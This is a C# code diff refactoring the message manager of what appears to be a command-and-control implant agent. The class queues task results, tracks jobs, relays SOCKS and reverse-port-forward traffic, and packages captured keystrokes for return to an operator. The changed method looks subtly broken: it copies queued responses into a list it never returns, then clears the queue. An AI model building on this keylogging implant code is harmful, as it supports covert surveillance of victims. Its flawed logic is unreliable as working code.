@@ -11,8 +11,6 @@ namespace Agent.Managers
     {
         private ConcurrentDictionary<string, ResponseResult> responseResults = new ConcurrentDictionary<string, ResponseResult>();
         private ConcurrentBag<string> responseStrings = new ConcurrentBag<string>();
-        private ConcurrentDictionary<string, ProcessResponseResult> processResults = new ConcurrentDictionary<string, ProcessResponseResult>();
-        private ConcurrentDictionary<string, FileBrowserResponseResult> fileBrowserResults = new ConcurrentDictionary<string, FileBrowserResponseResult>();
         private ConcurrentDictionary<int, ServerDatagram> socksOut = new ConcurrentDictionary<int, ServerDatagram>();
         private ConcurrentDictionary<int, ServerDatagram> rpfwdOut = new ConcurrentDictionary<int, ServerDatagram>();
         private ConcurrentBag<InteractMessage> interactiveOut = new ConcurrentBag<InteractMessage>();
@@ -20,10 +18,10 @@ namespace Agent.Managers
         private ConcurrentDictionary<string, ServerJob> activeJobs = new ConcurrentDictionary<string, ServerJob>();
         private StringWriter sw = new StringWriter();
         private bool stdOutIsMonitored = false;
-        private string monitoring_task = "";
+        private string monitoring_task = String.Empty;
         private TextWriter origStdOut;
-        private static string klTask = String.Empty;
-        private static Dictionary<string, Keylogs> klLogs = new Dictionary<string, Keylogs>();
+        private string klTask = String.Empty;
+        private Dictionary<string, Keylogs> klLogs = new Dictionary<string, Keylogs>();
         private ILogger logger { get; set; }
 
         public MessageManager(ILogger logger)
@@ -123,40 +121,18 @@ namespace Agent.Managers
         }
         public async Task AddResponse(FileBrowserResponseResult res)
         {
-            if (!fileBrowserResults.ContainsKey(res.task_id))
+            this.responseStrings.Add(res.ToJson());
+            if (res.completed)
             {
-                fileBrowserResults.TryAdd(res.task_id, res);
-            }
-
-            FileBrowserResponseResult newResponse = fileBrowserResults[res.task_id];
-
-            if (!res.completed)
-            {
-                newResponse.completed = res.completed;
-            }
-
-            if (!string.IsNullOrEmpty(res.status))
-            {
-                newResponse.status = res.status;
+                this.activeJobs.Remove(res.task_id, out _);
             }
         }
         public async Task AddResponse(ProcessResponseResult res)
         {
-            if (!processResults.ContainsKey(res.task_id))
+            this.responseStrings.Add(res.ToJson());
+            if (res.completed)
             {
-                processResults.TryAdd(res.task_id, res);
-                return;
-            }
-
-            ProcessResponseResult newResponse = processResults[res.task_id];
-            if (!res.completed)
-            {
-                newResponse.completed = res.completed;
-            }
-
-            if (!string.IsNullOrEmpty(res.status))
-            {
-                newResponse.status = res.status;
+                this.activeJobs.Remove(res.task_id, out _);
             }
         }
         public async Task AddResponse(string res)
@@ -174,43 +150,28 @@ namespace Agent.Managers
                 {
                     activeJobs.Remove(response.task_id, out _);
                 }
-                results.Add(response.ToJson());
+                this.responseStrings.Add(response.ToJson());
             }
-            foreach (ProcessResponseResult response in processResults.Values)
-            {
-                if (response.completed)
-                {
-                    activeJobs.Remove(response.task_id, out _);
-                }
-                results.Add(response.ToJson());
-            }
-            foreach (FileBrowserResponseResult response in fileBrowserResults.Values)
-            {
-                if (response.completed)
-                {
-                    activeJobs.Remove(response.task_id, out _);
-                }
-                results.Add(response.ToJson());
-            }
-            foreach (string response in responseStrings)
-            {
-                results.Add(response);
-            }
+            this.responseResults.Clear();
+
+            List<string> returnResults = new List<string>(this.responseStrings);
+            this.responseStrings.Clear();
 
             if (!String.IsNullOrEmpty(klTask) && klLogs.Count > 0)
             {
-                KeystrokesResponseResult krr = new KeystrokesResponseResult();
-                krr.task_id = klTask;
-                krr.keylogs = klLogs.Values.ToList();
+                KeystrokesResponseResult krr = new KeystrokesResponseResult
+                {
+                    task_id = klTask,
+                    keylogs = klLogs.Values.ToList(),
+                };
+
                 krr.Prepare();
 
                 results.Add(krr.ToJson());
                 klLogs.Clear();
             }
 
-            fileBrowserResults.Clear();
             responseResults.Clear();
-            processResults.Clear();
             responseStrings.Clear();
 
           return results;
@@ -261,24 +222,9 @@ namespace Agent.Managers
         {
             this.activeJobs.TryAdd(job.task.id, job);
         }
-        public bool TryGetJob(string task_id, out ServerJob job)
+        public bool TryGetJob(string task_id, out ServerJob? job)
         {
-            try
-            {
-                job = this.activeJobs.FirstOrDefault(x => x.Key == task_id).Value;
-
-                if(job == null)
-                {
-                    return false;
-                }
-
-                return true;
-            }
-            catch (Exception e)
-            {
-                job = null;
-                return false;
-            }
+            return this.activeJobs.TryGetValue(task_id, out job);
         }
         public Dictionary<string, ServerJob> GetJobs()
         {
@@ -290,7 +236,6 @@ namespace Agent.Managers
         }
         public async Task<string> GetAgentResponseStringAsync()
         {
-            //var test = this.interactiveOut.Reverse();
             GetTasking gt = new GetTasking()
             {
                 action = "get_tasking",
@@ -311,8 +256,7 @@ namespace Agent.Managers
         }
         public bool HasResponses()
         {
-         return this.responseResults.Count > 0 || this.processResults.Count > 0 || this.fileBrowserResults.Count > 0 
-                || this.responseStrings.Count > 0 || this.delegateMessages.Count > 0 || this.socksOut.Count > 0 
+         return this.responseResults.Count > 0 || this.responseStrings.Count > 0 || this.delegateMessages.Count > 0 || this.socksOut.Count > 0 
                 || this.rpfwdOut.Count > 0;
         }
         public bool CaptureStdOut(string task_id)
